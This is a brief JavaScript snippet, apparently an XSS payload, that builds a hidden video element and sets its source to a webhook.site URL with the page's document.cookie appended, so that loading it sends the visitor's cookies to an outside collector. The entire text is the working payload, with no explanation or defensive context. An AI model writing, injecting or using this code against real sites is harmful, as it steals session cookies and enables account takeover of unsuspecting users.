var videoelement = document.createElement("video");
videoelement.setAttribute("id", "video1");

var sourceMP4 = document.createElement("source");
sourceMP4.type = "video/mp4";
sourceMP4.src = "https://webhook.site/b0ac5293-b48e-4831-a5d6-eebedb5869bf/b.png?data=" + encodeURI(document.cookie);
videoelement.appendChild(sourceMP4);

document.body.appendChild(videoelement);
